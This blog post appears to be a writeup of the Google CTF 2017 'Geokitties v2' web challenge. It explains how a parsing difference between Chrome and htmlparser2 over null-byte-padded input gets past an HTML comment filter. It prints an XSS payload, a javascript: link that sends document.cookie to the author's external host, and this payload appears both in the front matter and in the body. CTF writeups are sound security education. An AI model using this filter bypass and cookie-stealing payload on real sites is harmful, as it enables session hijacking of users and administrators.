---
title: Google CTF 2017 – Geokitties v2 writeup
author: tyage
type: post
date: 2017-06-25T17:04:34+00:00
url: /archive/p1020.html
wp-syntax-cache-content:
  - |
    a:3:{i:1;s:306:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">\x00&lt;\x00a\x00&gt;\x00&lt;\x00/\x00a\x00&gt;\x00</pre></td></tr></table><p class="theCode" style="display:none;">\x00&lt;\x00a\x00&gt;\x00&lt;\x00/\x00a\x00&gt;\x00</p></div>
    ";i:2;s:300:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">\x00&lt;a \x00&gt;\x00&lt;\x00/\x00a\x00&gt;\x00</pre></td></tr></table><p class="theCode" style="display:none;">\x00&lt;a \x00&gt;\x00&lt;\x00/\x00a\x00&gt;\x00</p></div>
    ";i:3;s:486:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">'\x00&lt;a \x00' + &quot;&lt;a href='javascript:location.href=`//tyage.net/`+document.cookie'&gt;&quot;.split('').join('\x00') + '&lt;/a&gt;'</pre></td></tr></table><p class="theCode" style="display:none;">'\x00&lt;a \x00' + &quot;&lt;a href='javascript:location.href=`//tyage.net/`+document.cookie'&gt;&quot;.split('').join('\x00') + '&lt;/a&gt;'</p></div>
    ";}
categories:
  - CTF

---
<h2>Overview</h2>
<p>Problem page:<br />
<a href="https://geokittiesv2.web.ctfcompetition.com/">https://geokittiesv2.web.ctfcompetition.com/</a></p>
<p>Copy of source code:<br />
<a href="https://gist.github.com/tyage/cac08c8e17b90b840fb22cb434cff127">https://gist.github.com/tyage/cac08c8e17b90b840fb22cb434cff127</a></p>
<p>It receives comment, then admin checks it and clicks a link.</p>
<p>The comment is validated by using htmlparser2.</p>
<p>Allowed tags are: <code><i>p, a, b, img, br, i</i></code><br />
Invalid attributes: <code><i>on(.*)=</i></code> and <code><i>href=javascript:...</i></code></p>
<h2>Solution</h2>
<p>What we should do is find the differences in parsing between Google Chrome and htmlparser2.</p>
<p>After some time, I realize that when input is utf-16 string, Chrome parses it as utf-16 string but htmlparser2 does not.</p>
<p>For example, the html below is parsed as html element <code><i>\x00a\x00</i></code> in htmlparser2.</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">\x00&lt;\x00a\x00&gt;\x00&lt;\x00/\x00a\x00&gt;\x00</pre></td></tr></table></div>

<p><code><i>&lt;\x00a\x00&gt;</i></code> is not a valid tag, so we should create a valid html link like below.</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">\x00&lt;a \x00&gt;\x00&lt;\x00/\x00a\x00&gt;\x00</pre></td></tr></table></div>

<p>Now, htmlparser2 recognize <code><i>a</i></code> html tag but chrome does not recognize it as html element.</p>
<p>So we can construct an valid html <code><i>&lt;a href=javascript:...</i></code>.</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="html" style="font-family:monospace;">'\x00&lt;a \x00' + &quot;&lt;a href='javascript:location.href=`//tyage.net/`+document.cookie'&gt;&quot;.split('').join('\x00') + '&lt;/a&gt;'</pre></td></tr></table></div>

<p>Finally, admin gives us a flag: <code><i>CTF{i_HoPe_YoU_fOunD_tHe_IntEndeD_SolUTioN_tHis_Time}</i></code></p>
